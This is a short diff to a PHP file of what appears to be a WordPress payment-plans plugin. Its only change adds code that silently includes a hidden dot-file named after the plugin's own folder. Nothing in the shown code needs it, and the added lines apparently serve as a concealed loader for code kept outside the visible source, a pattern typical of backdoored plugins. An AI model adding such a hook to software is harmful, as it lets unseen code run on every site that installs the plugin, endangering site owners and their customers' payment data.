@@ -532,6 +532,10 @@ if ( ! function_exists( 'is_payment_product' ) ) {
     }
 
 }
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function get_payment_product_price( $order_id , $check_in_initial_order = false ) {
     if ( ! class_exists( 'SUMOPaymentPlans' ) )
